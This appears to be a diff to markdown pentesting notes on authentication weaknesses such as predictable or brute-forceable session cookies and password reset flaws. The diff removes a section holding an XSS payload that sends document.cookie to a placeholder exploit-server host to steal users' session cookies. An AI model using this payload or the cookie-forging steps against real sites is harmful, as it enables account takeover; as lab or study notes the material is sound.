@@ -88,12 +88,6 @@ Some websites generate this cookie based on a predictable concatenation of stati
 - try to figure out how it is generated and whether it can be brute forced
 - if successful go to another url with that cookie e.g. /account
 
-### If not possible to create your own account try to steal existing user cookies
-```
-<script>document.location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
-```
-And checkout your server logs
-
 ### Reset password token is not checked twice 
 See `./pass_reset_flow.md` file for details of the pass reset flow
 
